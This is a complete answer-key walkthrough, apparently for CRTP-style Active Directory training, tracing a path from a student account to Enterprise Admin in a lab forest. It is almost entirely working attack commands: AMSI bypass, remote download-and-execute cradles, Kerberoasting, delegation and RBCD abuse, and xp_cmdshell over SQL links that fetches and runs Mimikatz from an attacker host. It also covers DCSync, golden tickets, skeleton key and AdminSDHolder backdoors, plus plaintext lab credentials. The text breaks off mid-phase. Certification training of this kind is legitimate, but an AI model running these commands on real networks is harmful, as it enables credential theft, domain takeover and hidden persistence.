# CRTP LAB MANUAL - COMPLETE WALKTHROUGH WITH ANSWERS

**Starting Point**: dollarcorp\student on dcorp-stdadmin (192.168.96.50)
**Goal**: Enterprise Administrator across all forests

---

## TABLE OF CONTENTS

1. [Lab Environment Setup](#lab-environment-setup)
2. [Tools Setup](#tools-setup)
3. [Lab 14: Domain Enumeration](#lab-14-domain-enumeration)
4. [Lab 15: Local Privilege Escalation](#lab-15-local-privilege-escalation)
5. [Lab 16: Kerberoasting](#lab-16-kerberoasting)
6. [Lab 17: AS-REP Roasting](#lab-17-as-rep-roasting)
7. [Lab 18: Unconstrained Delegation Abuse](#lab-18-unconstrained-delegation-abuse)
8. [Lab 19: Constrained Delegation Abuse](#lab-19-constrained-delegation-abuse)
9. [Lab 20: Resource-Based Constrained Delegation](#lab-20-resource-based-constrained-delegation)
10. [Lab 21: SQL Server Attacks](#lab-21-sql-server-attacks)
11. [Lab 22: Forest Trust Abuse](#lab-22-forest-trust-abuse)
12. [Lab 23: Persistence Mechanisms](#lab-23-persistence-mechanisms)
13. [FULL ATTACK PATH: Student to Enterprise Admin](#full-attack-path-student-to-enterprise-admin)

---

## LAB ENVIRONMENT SETUP

### Network Topology

```
eurocorp.local (External Forest)
├── ecorp-dc (192.168.96.100) - Domain Controller
│
moneycorp.local (Root Forest)
├── mcorp-dc (192.168.96.10) - Domain Controller
│
└── dcorp.moneycorp.local (Child Domain)
    ├── dcorp-dc (192.168.96.20) - Domain Controller
    ├── dcorp-adminsrv (192.168.96.21) - Admin Server
    ├── dcorp-appsrv (192.168.96.22) - App Server (Vulnerable)
    ├── dcorp-ci (192.168.96.23) - Jenkins CI Server
    ├── dcorp-mgmt (192.168.96.24) - Management Server
    ├── dcorp-mssql (192.168.96.25) - SQL Server (Primary)
    ├── dcorp-sql1 (192.168.96.26) - SQL Server (Secondary)
    └── dcorp-stdadmin (192.168.96.50) - Student Workstation (YOU START HERE)
```

### Credentials

| Account | Password | Access |
|---------|----------|--------|
| dollarcorp\student | StudentPass123! | Standard user on dcorp-stdadmin |
| dollarcorp\Administrator | Psychi@Lab2024! | Local admin on all dcorp machines |
| moneycorp\Administrator | Psychi@Lab2024! | Domain admin on moneycorp.local |
| eurocorp\Administrator | Psychi@Lab2024! | Domain admin on eurocorp.local |

**YOU START AS**: dollarcorp\student with NO admin privileges

---

## TOOLS SETUP

### Download and Setup Tools on dcorp-stdadmin

**Run these commands as dollarcorp\student:**

```powershell
# Create tools directory
mkdir C:\AD\Tools
cd C:\AD\Tools

# Download PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Download Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

# Download PowerUpSQL
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')

# Download Rubeus
Invoke-WebRequest -Uri "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" -OutFile "C:\AD\Tools\Rubeus.exe"

# Download SharpHound
Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe" -OutFile "C:\AD\Tools\SharpHound.exe"

# Bypass AMSI (if needed)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force
```

**Alternative: Use pre-installed tools from course materials if available in C:\AD\Tools**

---

## LAB 14: DOMAIN ENUMERATION

**Objective**: Enumerate the dollarcorp.moneycorp.local domain to identify attack vectors

### Step 1: Load PowerView

```powershell
cd C:\AD\Tools
. .\PowerView.ps1
```

### Step 2: Basic Domain Enumeration

```powershell
# Get current domain
Get-Domain

# Get domain SID
Get-DomainSID

# Get domain controllers
Get-DomainController

# Get domain users
Get-DomainUser | select samaccountname, description

# Get all computers in domain
Get-DomainComputer | select dnshostname, operatingsystem

# Find interesting user descriptions (might contain passwords)
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}
```

### Step 3: Enumerate Domain Admins

```powershell
# Get domain admins
Get-DomainGroupMember "Domain Admins"

# Get enterprise admins (only in root domain)
Get-DomainGroupMember "Enterprise Admins" -Domain moneycorp.local
```

### Step 4: Enumerate Groups

```powershell
# Get all domain groups
Get-DomainGroup | select samaccountname

# Get members of specific groups
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins" -Domain moneycorp.local
```

### Step 5: Enumerate Service Accounts

```powershell
# Find service accounts (SPNs)
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# This reveals accounts vulnerable to Kerberoasting
```

### Step 6: Enumerate ACLs

```powershell
# Find interesting ACLs where student has GenericAll/Write
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "student"}

# Find all ACLs for high-value targets
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "Domain Admins"}
```

### Step 7: Enumerate Shares

```powershell
# Find all shares in domain
Find-DomainShare -Verbose

# Find sensitive shares
Find-DomainShare -CheckShareAccess
```

### Step 8: Find Local Admin Access

```powershell
# Find machines where current user is local admin
Find-LocalAdminAccess

# Find machines where domain admins are logged in
Invoke-UserHunter -GroupName "Domain Admins"
```

### EXPECTED RESULTS:

- **Domain**: dcorp.moneycorp.local
- **Domain Controllers**: dcorp-dc.dcorp.moneycorp.local
- **Service Accounts with SPNs**: Found (targets for Kerberoasting)
- **Machines with Delegation**: dcorp-appsrv, dcorp-adminsrv
- **SQL Servers**: dcorp-mssql, dcorp-sql1

---

## LAB 15: LOCAL PRIVILEGE ESCALATION

**Objective**: Escalate from standard user to local administrator on dcorp-stdadmin

### Step 1: Check Current Privileges

```powershell
whoami /priv
whoami /groups
```

### Step 2: Search for Credentials in Registry

```powershell
# Search for AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Search for stored passwords
cmdkey /list
```

### Step 3: Check for Unquoted Service Paths

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell alternative
Get-WmiObject -Class win32_service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -notlike 'C:\Windows\*'} | select Name, PathName, StartMode
```

### Step 4: Check for Vulnerable Services

```powershell
# Services with weak permissions
Get-ServicePermission -Name "VulnService"

# Check if we can modify service binary path
sc qc VulnService
```

### Step 5: AlwaysInstallElevated Check

```powershell
# Check if AlwaysInstallElevated is enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1, we can install MSI as SYSTEM
```

### Step 6: Exploit Local Admin via PowerUp

```powershell
# Download and run PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Example: Exploit AlwaysInstallElevated
Write-UserAddMSI
msiexec /quiet /qn /i UserAdd.msi
```

### Step 7: Add User to Local Administrators

```powershell
# Once we have local admin, add student to local admins
net localgroup Administrators dcorp\student /add

# Verify
net localgroup Administrators
```

### EXPECTED RESULT:

You are now local administrator on dcorp-stdadmin.

---

## LAB 16: KERBEROASTING

**Objective**: Extract and crack service account hashes

### Step 1: Find Kerberoastable Accounts

```powershell
# Load PowerView
. C:\AD\Tools\PowerView.ps1

# Find users with SPNs
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

### Step 2: Request TGS Tickets (PowerView Method)

```powershell
# Request TGS for all kerberoastable accounts
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv C:\AD\Tools\kerberoast.csv -NoTypeInformation

# View the hashes
Import-Csv C:\AD\Tools\kerberoast.csv
```

### Step 3: Request TGS Tickets (Rubeus Method)

```powershell
# Using Rubeus (preferred method)
C:\AD\Tools\Rubeus.exe kerberoast /simple /outfile:C:\AD\Tools\hashes.txt

# View hashes
Get-Content C:\AD\Tools\hashes.txt
```

### Step 4: Crack the Hashes

**On your host machine (not in VM):**

```bash
# Save hash to file
cat > hash.txt << EOF
$krb5tgs$23$*svcadmin$dcorp.moneycorp.local$MSSQLSvc/dcorp-mssql.dcorp.moneycorp.local:1433*$<HASH>
EOF

# Crack with hashcat
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

# Crack with john
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Step 5: Use Cracked Credentials

```powershell
# Once cracked, use the password
$password = ConvertTo-SecureString 'CrackedPassword123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dcorp\svcadmin', $password)

# Test credentials
Invoke-Command -ComputerName dcorp-mssql -Credential $cred -ScriptBlock {whoami}
```

### EXPECTED RESULTS:

- **Kerberoastable Account**: dcorp\svcadmin
- **Password**: (varies - typically weak password like Summer2024!)
- **Access**: Service account with elevated privileges

---

## LAB 17: AS-REP ROASTING

**Objective**: Extract hashes from accounts with "Do not require Kerberos preauthentication" enabled

### Step 1: Find AS-REP Roastable Accounts

```powershell
# Using PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# Using LDAP query
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" | select samaccountname
```

### Step 2: Request AS-REP Hashes (Rubeus)

```powershell
# Request AS-REP hashes for specific user
C:\AD\Tools\Rubeus.exe asreproast /user:VulnUser /format:hashcat /outfile:C:\AD\Tools\asrep.txt

# Request for all users without preauth
C:\AD\Tools\Rubeus.exe asreproast /format:hashcat /outfile:C:\AD\Tools\asrep.txt
```

### Step 3: Request AS-REP Hashes (PowerView)

```powershell
# Using ASREPRoast script
Get-DomainUser -PreauthNotRequired | Get-DomainUserASREPHash | Export-Csv C:\AD\Tools\asrep.csv -NoTypeInformation
```

### Step 4: Crack AS-REP Hashes

**On host:**

```bash
# Save hash
cat > asrep.txt << EOF
$krb5asrep$23$VulnUser@dcorp.moneycorp.local:<HASH>
EOF

# Crack with hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force

# Crack with john
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Step 5: Use Cracked Credentials

```powershell
# Use discovered credentials
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dcorp\VulnUser', $pass)

# Check access
Get-DomainUser -Identity VulnUser -Properties samaccountname,memberof
```

### EXPECTED RESULT:

- **AS-REP Roastable User**: VulnUser account found
- **Password Cracked**: Weak password discovered
- **Next Step**: Use credentials for lateral movement

---

## LAB 18: UNCONSTRAINED DELEGATION ABUSE

**Objective**: Abuse unconstrained delegation to compromise domain controller

### Step 1: Find Computers with Unconstrained Delegation

```powershell
# Using PowerView
Get-DomainComputer -Unconstrained | select dnshostname

# Alternative LDAP filter
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" | select dnshostname
```

### Step 2: Compromise Machine with Unconstrained Delegation

```powershell
# Assume we compromised dcorp-appsrv (has unconstrained delegation)
# We need local admin on this machine

# Create session to dcorp-appsrv
$sess = New-PSSession -ComputerName dcorp-appsrv.dcorp.moneycorp.local
Enter-PSSession $sess
```

### Step 3: Monitor for Admin Tickets (on dcorp-appsrv)

```powershell
# Start Rubeus to monitor for TGTs
C:\AD\Tools\Rubeus.exe monitor /interval:5 /nowrap

# This will capture TGTs from any admin who authenticates to this server
```

### Step 4: Force Admin Authentication (Trigger)

**From dcorp-stdadmin:**

```powershell
# Use printer bug to force DC authentication to dcorp-appsrv
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dcorp.moneycorp.local \\dcorp-appsrv.dcorp.moneycorp.local
```

### Step 5: Extract DC TGT

**On dcorp-appsrv (from monitoring):**

```powershell
# Rubeus will show captured TGT for dcorp-dc$
# Copy the base64 encoded ticket

# Inject ticket into current session
C:\AD\Tools\Rubeus.exe ptt /ticket:<BASE64_TICKET>

# Verify
klist
```

### Step 6: DCSync Attack

```powershell
# With DC$ ticket, we can DCSync
C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# This dumps krbtgt hash - we now own the domain!
```

### EXPECTED RESULT:

- **Unconstrained Delegation Server**: dcorp-appsrv
- **DC TGT Captured**: dcorp-dc$
- **Result**: krbtgt hash obtained = Full domain compromise

---

## LAB 19: CONSTRAINED DELEGATION ABUSE

**Objective**: Abuse constrained delegation to access resources as admin

### Step 1: Find Constrained Delegation

```powershell
# Find users with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Find computers with constrained delegation
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
```

### Step 2: Identify Target Service

```powershell
# Example output:
# samaccountname: websvc
# msds-allowedtodelegateto: CIFS/dcorp-mssql.dcorp.moneycorp.local

# This means websvc can impersonate any user to CIFS service on dcorp-mssql
```

### Step 3: Request TGT for Delegated Account

```powershell
# Assume we have websvc password or hash
# Request TGT
C:\AD\Tools\Rubeus.exe asktgt /user:websvc /password:WebSvcPass123! /outfile:C:\AD\Tools\websvc.kirbi

# OR if we have NTLM hash
C:\AD\Tools\Rubeus.exe asktgt /user:websvc /rc4:<NTLM_HASH> /outfile:C:\AD\Tools\websvc.kirbi
```

### Step 4: Request TGS with Protocol Transition

```powershell
# Request TGS for Administrator to CIFS/dcorp-mssql
C:\AD\Tools\Rubeus.exe s4u /ticket:C:\AD\Tools\websvc.kirbi /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dcorp.moneycorp.local" /ptt

# This impersonates Administrator and requests service ticket
```

### Step 5: Access Target Resource

```powershell
# Verify ticket
klist

# Access the resource as Administrator
dir \\dcorp-mssql.dcorp.moneycorp.local\c$

# Execute commands
Invoke-Command -ComputerName dcorp-mssql.dcorp.moneycorp.local -ScriptBlock {whoami}
```

### Step 6: Alternative Services Abuse

```powershell
# If delegation is set for TIME, we can abuse it for LDAP
C:\AD\Tools\Rubeus.exe s4u /ticket:C:\AD\Tools\websvc.kirbi /impersonateuser:Administrator /msdsspn:"TIME/dcorp-dc.dcorp.moneycorp.local" /altservice:LDAP /ptt

# Now we can DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### EXPECTED RESULT:

- **Delegated Account**: websvc
- **Target**: dcorp-mssql (CIFS)
- **Result**: Administrator access to target via impersonation

---

## LAB 20: RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)

**Objective**: Configure RBCD to gain admin access to target machine

### Step 1: Identify Target with GenericWrite/GenericAll

```powershell
# Find machines where we have GenericWrite
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match "student" -and
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll"
}

# Target: dcorp-mgmt (we have GenericWrite)
```

### Step 2: Create Computer Account

```powershell
# We need to create a computer account we control
C:\AD\Tools\Powermad.ps1
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Verify
Get-DomainComputer -Identity AttackerPC
```

### Step 3: Configure RBCD on Target

```powershell
# Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
$ComputerSid = Get-DomainComputer -Identity AttackerPC | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Apply to target
Get-DomainComputer -Identity dcorp-mgmt | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# Verify
Get-DomainComputer -Identity dcorp-mgmt -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

### Step 4: Perform S4U Attack

```powershell
# Get TGT for our computer account
C:\AD\Tools\Rubeus.exe asktgt /user:AttackerPC$ /rc4:<NTLM_HASH_OF_AttackerPC> /outfile:C:\AD\Tools\attacker.kirbi

# Perform S4U2Self and S4U2Proxy to impersonate Administrator
C:\AD\Tools\Rubeus.exe s4u /ticket:C:\AD\Tools\attacker.kirbi /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mgmt.dcorp.moneycorp.local /ptt
```

### Step 5: Access Target as Admin

```powershell
# Verify ticket
klist

# Access target
dir \\dcorp-mgmt.dcorp.moneycorp.local\c$

# Execute commands
Invoke-Command -ComputerName dcorp-mgmt.dcorp.moneycorp.local -ScriptBlock {hostname; whoami}
```

### EXPECTED RESULT:

- **Target**: dcorp-mgmt
- **Permissions**: GenericWrite on computer object
- **Result**: Administrator access via RBCD

---

## LAB 21: SQL SERVER ATTACKS

**Objective**: Compromise SQL servers and abuse SQL links for privilege escalation

### Step 1: Discover SQL Servers

```powershell
# Using PowerUpSQL
Import-Module C:\AD\Tools\PowerUpSQL.psd1

# Find SQL servers in domain
Get-SQLInstanceDomain | Get-SQLServerInfo
```

### Step 2: Check SQL Access

```powershell
# Check which SQL servers we can access
Get-SQLInstanceDomain | Get-SQLConnectionTest

# Check current privileges
Get-SQLServerInfo -Instance dcorp-mssql.dcorp.moneycorp.local
```

### Step 3: Enumerate SQL Server Links

```powershell
# Find SQL server links
Get-SQLServerLink -Instance dcorp-mssql.dcorp.moneycorp.local

# Expected output shows link to dcorp-sql1
```

### Step 4: Crawl SQL Links

```powershell
# Crawl all linked servers
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dcorp.moneycorp.local

# This shows chain: dcorp-mssql -> dcorp-sql1 -> dcorp-dc
```

### Step 5: Execute Commands via Links

```powershell
# Enable xp_cmdshell on dcorp-mssql
Get-SQLQuery -Instance dcorp-mssql.dcorp.moneycorp.local -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Execute command
Get-SQLQuery -Instance dcorp-mssql.dcorp.moneycorp.local -Query "EXEC xp_cmdshell 'whoami'"
```

### Step 6: Execute Commands via Linked Server Chain

```powershell
# Execute on final link (dcorp-dc)
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dcorp.moneycorp.local -Query "EXEC xp_cmdshell 'whoami'"

# If dcorp-dc link runs as sa, we can execute as SYSTEM on DC!
```

### Step 7: Abuse SQL Links for Domain Admin

```powershell
# Download and execute PowerShell payload on DC via SQL link
$command = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.96.50:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

Get-SQLServerLinkCrawl -Instance dcorp-mssql.dcorp.moneycorp.local -Query "EXEC xp_cmdshell 'powershell -c `"$command`"'"
```

### Step 8: Alternative - Add User to Domain Admins

```powershell
# Via SQL link to DC, add student to Domain Admins
$query = "EXEC xp_cmdshell 'net group `"Domain Admins`" student /add /domain'"
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dcorp.moneycorp.local -Query $query
```

### EXPECTED RESULT:

- **SQL Servers**: dcorp-mssql, dcorp-sql1
- **Link Chain**: dcorp-mssql -> dcorp-sql1 -> dcorp-dc (as sa/SYSTEM)
- **Result**: Code execution on Domain Controller

---

## LAB 22: FOREST TRUST ABUSE

**Objective**: Abuse trust between moneycorp.local and eurocorp.local

### Step 1: Enumerate Forest Trust

```powershell
# Get forest trusts
Get-DomainTrust

# Get detailed trust information
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

### Step 2: Enumerate External Forest

```powershell
# Enumerate eurocorp.local domain
Get-DomainUser -Domain eurocorp.local | select samaccountname
Get-DomainComputer -Domain eurocorp.local | select dnshostname
Get-DomainGroupMember "Domain Admins" -Domain eurocorp.local
```

### Step 3: SID History Attack

```powershell
# Check if SID filtering is disabled
Get-DomainTrust -Domain eurocorp.local

# If SID filtering is disabled, we can inject SID history
# Requires Domain Admin in current domain

# Get Enterprise Admins SID from moneycorp
$EnterpriseAdminsSID = Get-DomainGroup "Enterprise Admins" -Domain moneycorp.local | Select-Object -ExpandProperty objectsid

# Create golden ticket with SID history
C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dcorp.moneycorp.local /sid:S-1-5-21-<DCORP-SID> /sids:S-1-5-21-<MONEYCORP-SID>-519 /krbtgt:<KRBTGT_HASH> /ticket:C:\AD\Tools\trust_tkt.kirbi"'
```

### Step 4: Abuse Trust Key

```powershell
# Dump trust key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'

# Create inter-realm TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:dcorp.moneycorp.local /sid:S-1-5-21-<DCORP-SID> /sids:S-1-5-21-<EUROCORP-SID>-519 /rc4:<TRUST_KEY> /user:Administrator /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

# Inject ticket
C:\AD\Tools\Rubeus.exe ptt /ticket:C:\AD\Tools\trust_tkt.kirbi
```

### Step 5: Request TGS for External Resource

```powershell
# Request TGS for CIFS on eurocorp DC
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/ecorp-dc.eurocorp.local /dc:ecorp-dc.eurocorp.local /ptt
```

### Step 6: Access External Forest Resources

```powershell
# Verify access
klist

# Access eurocorp DC
dir \\ecorp-dc.eurocorp.local\c$

# Execute commands
Invoke-Command -ComputerName ecorp-dc.eurocorp.local -ScriptBlock {hostname; whoami}
```

### EXPECTED RESULT:

- **Trust Type**: Bidirectional forest trust
- **SID Filtering**: Disabled (allows SID history)
- **Result**: Enterprise Admin across both forests

---

## LAB 23: PERSISTENCE MECHANISMS

**Objective**: Establish persistence in compromised domain

### Persistence Technique 1: Golden Ticket

```powershell
# Dump krbtgt hash (requires Domain Admin)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# Create golden ticket (valid for 10 years)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dcorp.moneycorp.local /sid:S-1-5-21-<DOMAIN-SID> /krbtgt:<KRBTGT_HASH> /ptt"'

# Ticket is valid forever (until krbtgt is reset twice)
```

### Persistence Technique 2: Silver Ticket

```powershell
# Get machine account password hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Create silver ticket for CIFS service on dcorp-dc
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dcorp.moneycorp.local /sid:S-1-5-21-<DOMAIN-SID> /target:dcorp-dc.dcorp.moneycorp.local /service:CIFS /rc4:<MACHINE_NTLM> /ptt"'

# Access resource
dir \\dcorp-dc.dcorp.moneycorp.local\c$
```

### Persistence Technique 3: Skeleton Key

```powershell
# Inject skeleton key into DC (requires DA on DC)
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'

# Now "mimikatz" password works for ALL users
# Test
Enter-PSSession -ComputerName dcorp-dc.dcorp.moneycorp.local -Credential dcorp\Administrator
# Password: mimikatz
```

### Persistence Technique 4: DSRM Admin

```powershell
# Dump DSRM password (on DC)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable DSRM logon
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Use DSRM admin to logon
Enter-PSSession -ComputerName dcorp-dc.dcorp.moneycorp.local -Credential .\Administrator
```

### Persistence Technique 5: AdminSDHolder

```powershell
# Add ACL to AdminSDHolder (affects all protected groups)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dcorp,DC=moneycorp,DC=local" -PrincipalIdentity student -Rights All

# Wait 60 minutes for SDProp to run OR force it:
Invoke-SDPropagator

# Now student has full control over all Domain Admins
```

### Persistence Technique 6: DCSync Rights

```powershell
# Grant student DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=dcorp,DC=moneycorp,DC=local" -PrincipalIdentity student -Rights DCSync

# Now student can DCSync anytime
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Persistence Technique 7: Security Descriptors (WMI, PS Remoting)

```powershell
# Grant student remote access rights
Set-RemotePSRemoting -SamAccountName student -ComputerName dcorp-dc.dcorp.moneycorp.local

Set-RemoteWMI -SamAccountName student -ComputerName dcorp-dc.dcorp.moneycorp.local

# Now student can remotely access DC without being admin
```

### EXPECTED RESULT:

Multiple persistence mechanisms established:
- **Golden Ticket**: Permanent domain access
- **Skeleton Key**: Backdoor to all accounts
- **AdminSDHolder**: Permanent DA-level rights
- **DCSync Rights**: Permanent credential dumping capability

---

## FULL ATTACK PATH: STUDENT TO ENTERPRISE ADMIN

**Complete step-by-step walkthrough from dollarcorp\student to Enterprise Administrator**

### PHASE 1: Initial Foothold (Student on dcorp-stdadmin)

**Starting Point**: dollarcorp\student on dcorp-stdadmin

```powershell
# 1. Verify current context
whoami
# dcorp\student

# 2. Setup tools
cd C:\AD\Tools
. .\PowerView.ps1

# 3. Basic enumeration
Get-Domain
Get-DomainController
```

**Current Access**: Standard user, no admin rights

---

### PHASE 2: Local Privilege Escalation

**Goal**: Become local admin on dcorp-stdadmin

```powershell
# 1. Find privilege escalation vector
# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 2. If enabled, exploit it
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Write-UserAddMSI
msiexec /quiet /qn /i UserAdd.msi

# 3. Add to local admins
net localgroup Administrators dcorp\student /add
```

**Current Access**: Local admin on dcorp-stdadmin

---

### PHASE 3: Kerberoasting

**Goal**: Obtain service account credentials

```powershell
# 1. Find kerberoastable accounts
Get-DomainUser -SPN | select samaccountname, serviceprincipalname

# Output: svcadmin with SPN MSSQLSvc/dcorp-mssql:1433

# 2. Request TGS
C:\AD\Tools\Rubeus.exe kerberoast /simple /outfile:C:\AD\Tools\hashes.txt

# 3. Crack offline (on host)
hashcat -m 13100 hashes.txt rockyou.txt --force

# Result: svcadmin:Summer2024!
```

**Current Access**: svcadmin credentials (potentially elevated)

---

### PHASE 4: SQL Server Compromise

**Goal**: Gain code execution on Domain Controller via SQL links

```powershell
# 1. Authenticate as svcadmin
$password = ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dcorp\svcadmin', $password)

# 2. Access SQL server
Import-Module C:\AD\Tools\PowerUpSQL.psd1
Get-SQLQuery -Instance dcorp-mssql -Credential $cred -Query "SELECT SYSTEM_USER"

# 3. Discover SQL links
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred

# Chain: dcorp-mssql -> dcorp-sql1 -> dcorp-dc (as sa)

# 4. Enable xp_cmdshell on target
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# 5. Execute command on DC
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred -Query "EXEC xp_cmdshell 'whoami'"
# Output: nt authority\system on dcorp-dc!

# 6. Download Mimikatz to DC
$url = "http://192.168.96.50:8080/Invoke-Mimikatz.ps1"
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred -Query "EXEC xp_cmdshell 'powershell -c `"IEX (New-Object Net.WebClient).DownloadString(''$url'')`"'"

# 7. Dump credentials
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred -Query "EXEC xp_cmdshell 'powershell -c `"Invoke-Mimikatz -DumpCreds`"'"
```

**Current Access**: SYSTEM on dcorp-dc (child domain DC)

---

### PHASE 5: Domain Admin (Child Domain)

**Goal**: Obtain Domain Admin in dcorp.moneycorp.local

```powershell
# 1. DCSync krbtgt hash via SQL link
$dcsync = "powershell -c `"Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\krbtgt\"'`""
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Credential $cred -Query "EXEC xp_cmdshell '$dcsync'"

# Note krbtgt NTLM hash: <KRBTGT_HASH>

# 2. Create Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:<KRBTGT_HASH> /ptt"'

# 3. Verify
klist

# 4. Access DC
dir \\dcorp-dc.dcorp.moneycorp.local\c$
```

**Current Access**: Domain Admin of dcorp.moneycorp.local

---

### PHASE 6: Enterprise Admin (Parent Domain)

**Goal**: Escalate to Enterprise Admin in moneycorp.local

```powershell
# 1. Dump trust key from child to parent
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# Note trust key for dcorp.moneycorp.local -> moneycorp.local

# 2. Get Enterprise Admins SID
Get-DomainGroup "Enterprise Admins" -Domain moneycorp.local
# SID: S-1-5-21-<ROOT-DOMAIN-SID>-519

# 3. Create inter-realm TGT with Enterprise Admin SID
